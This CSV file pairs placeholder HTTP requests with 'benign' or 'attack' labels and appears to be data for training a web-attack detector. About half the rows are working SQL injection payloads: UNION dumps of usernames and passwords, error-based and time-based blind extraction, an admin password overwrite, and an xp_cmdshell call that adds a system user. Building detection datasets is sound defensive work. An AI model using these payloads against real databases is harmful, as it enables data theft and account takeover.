payload,label
GET http://<HOST>/<PATH>?product_id=882&warehouse=east,benign
"GET http://<HOST>/<PATH>?id=1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",attack
POST http://<HOST>/<PATH>?username=budi&role=viewer&dept=hr,benign
GET http://<HOST>/<PATH>?id=1 UNION SELECT NULL,NULL,NULL,user(),NULL--,attack
GET http://<HOST>/<PATH>?lang=en&timezone=UTC&format=24h,benign
"GET http://<HOST>/<PATH>?id=1';UPDATE users SET password='hacked' WHERE username='admin'--",attack
POST http://<HOST>/<PATH>?ticket_id=TKT-44821&priority=high&assigned=ops,benign
GET http://<HOST>/<PATH>?id=1 AND ORD(SUBSTR((SELECT password FROM users LIMIT 1),1,1))>97--,attack
GET http://<HOST>/<PATH>?page=about&section=team&format=html,benign
"GET http://<HOST>/<PATH>?id=1')) AND SLEEP(5) AND (('xyz'='xyz",attack
GET http://<HOST>/<PATH>?store=malang&aisle=3&shelf=B,benign
GET http://<HOST>/<PATH>?id=1 AND UPDATEXML(9999,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())),1)--,attack
POST http://<HOST>/<PATH>?appointment=2024-07-15&doctor_id=D882&slot=09:00,benign
"GET http://<HOST>/<PATH>?id=1' AND IF(SUBSTR(database(),1,1)='a',SLEEP(4),0)--",attack
GET http://<HOST>/<PATH>?playlist_id=PL9921&shuffle=true&repeat=one,benign
GET http://<HOST>/<PATH>?id=1 UNION SELECT username,password,3,4 FROM admin_users--,attack
GET http://<HOST>/<PATH>?class=mathematics&grade=10&semester=1,benign
"GET http://<HOST>/<PATH>?id=1' OR ELT(1=1,SLEEP(3))--",attack
POST http://<HOST>/<PATH>?vendor_id=V2291&invoice=INV-882&due=2024-08-01,benign
GET http://<HOST>/<PATH>?id=0 UNION ALL SELECT NULL,CONCAT(0x7e,database(),0x7e),NULL,NULL--,attack
GET http://<HOST>/<PATH>?campus=kediri&building=A&floor=2,benign
"GET http://<HOST>/<PATH>?id=1';EXEC master..xp_cmdshell('net user hacker P@ss /add')--",attack
GET http://<HOST>/<PATH>?origin=CGK&destination=SUB&date=2024-07-20,benign
GET http://<HOST>/<PATH>?id=1 AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)=1--,attack
POST http://<HOST>/<PATH>?log_level=info&service=auth&instance=prod-1,benign
"GET http://<HOST>/<PATH>?id=1' UNION SELECT NULL,CONCAT(table_name,0x3a,column_name) FROM information_schema.columns--",attack
GET http://<HOST>/<PATH>?sensor_id=SN4421&unit=celsius&interval=5m,benign
GET http://<HOST>/<PATH>?id=1 AND CHAR(117)+CHAR(115)+CHAR(101)+CHAR(114)>0--,attack
GET http://<HOST>/<PATH>?branch=surabaya&type=savings&currency=IDR,benign
"GET http://<HOST>/<PATH>?id=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(username,0x3a,password) FROM users)))--",attack
POST http://<HOST>/<PATH>?promo_code=DISC10&user_id=U7721&apply=true,benign
GET http://<HOST>/<PATH>?id=1 OR (SELECT SUBSTR(username,1,3) FROM users WHERE id=1)='adm'--,attack
GET http://<HOST>/<PATH>?resolution=4k&codec=h265&bitrate=8000,benign
"GET http://<HOST>/<PATH>?id=1' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(database(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x LIMIT 1)--",attack
GET http://<HOST>/<PATH>?building_id=BLD-33&meter=electricity&month=6,benign
GET http://<HOST>/<PATH>?id=1 AND (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)>5)=1--,attack
POST http://<HOST>/<PATH>?survey_id=SRV-1182&answer=agree&q=3,benign
"GET http://<HOST>/<PATH>?id=1 UNION SELECT 1,2,3,4,5,6,7,8,group_concat(username,0x3a,password),10 FROM users--",attack
GET http://<HOST>/<PATH>?venue=jcc&event=techfest&gate=B,benign
GET http://<HOST>/<PATH>?id=1 AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1))>64--,attack
GET http://<HOST>/<PATH>?app=mobile&os=ios&version=17.2,benign
"GET http://<HOST>/<PATH>?id=1') OR SLEEP(5) AND ('1'='1",attack
POST http://<HOST>/<PATH>?parent_id=P9921&child=node_3&depth=2,benign
GET http://<HOST>/<PATH>?id=1 AND 1=2 UNION SELECT NULL,NULL,@@datadir--,attack
GET http://<HOST>/<PATH>?ward=cempaka&bed=12&type=vip,benign
